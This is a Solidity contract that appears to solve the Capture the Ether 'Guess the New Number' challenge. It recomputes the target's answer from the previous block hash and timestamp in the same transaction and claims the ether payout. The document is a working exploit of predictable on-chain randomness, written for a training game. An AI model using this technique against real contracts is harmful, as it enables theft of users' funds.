// SPDX-License-Identifier: GPL-3.0

import "./GuessTheNewNumber.sol";

pragma solidity ^0.4.21;

contract GuessTheNewNumberGuesser {
    function GuessTheNewNumberGuesser() public {}
    
    function guess(address challengeContract) external payable {
        GuessTheNewNumberChallenge _challengeContract = GuessTheNewNumberChallenge(challengeContract);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        _challengeContract.guess.value(msg.value)(answer);
    }
    
    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }
    
    function() external payable {
        
    }
}